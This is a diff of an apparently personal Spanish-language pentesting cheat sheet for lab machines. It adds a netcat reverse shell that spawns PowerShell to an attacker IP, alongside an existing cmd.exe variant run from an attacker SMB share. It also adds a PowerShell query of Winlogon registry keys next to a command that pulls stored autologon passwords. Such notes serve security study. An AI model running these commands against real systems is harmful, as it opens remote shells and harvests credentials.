@@ -3452,6 +3452,12 @@ De donde s4vitar baja su nc.exe
 \\10.10.14.80\share\nc.exe -e cmd.exe 10.10.14.80 443
 
 ```
+Mejor usa powershell
+
+```
+nc.exe -e powershell.exe 10.10.14.80 443
+```
+
 > https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 > https://www.hackingarticles.in/windows-for-pentester-certutil/
 > https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
@@ -3989,6 +3995,11 @@ NOta en la maquina bart usa esto 0xd pero se tiene que ejecutar en un proceso de
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 ```
 
+En powershell
+
+```
+Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+```
 
 ### Montar un recurso con windows
 
